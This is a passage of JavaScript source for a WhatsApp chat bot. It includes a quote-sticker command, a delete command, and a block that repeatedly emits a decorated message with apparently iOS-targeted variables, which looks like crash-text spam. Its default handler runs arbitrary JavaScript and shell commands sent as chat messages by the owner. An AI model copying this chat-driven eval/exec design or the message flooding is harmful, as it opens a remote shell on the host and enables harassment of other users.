konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
 	}
break
case  'qcstick':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await zetsubo.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await zetsubo.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await zetsubo.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
case 'delete':{
zetsubo.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
//=================================================
default:
if (budy.startsWith('=>')) {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
zetsubo.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply (util.format(err))
    console.log(err)
    let e = String(err)                                                                      
    if (e.includes("not-authorized")) return
    if (e.includes("already-exists")) return                                                 
    if (e.includes("rate-overlimit")) return
    if (e.includes("Connection Closed")) return
    if (e.includes("Timed Out")) return
    if (e.includes("Value not found")) return
    if (e.includes("Socket connection timeout")) return
}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
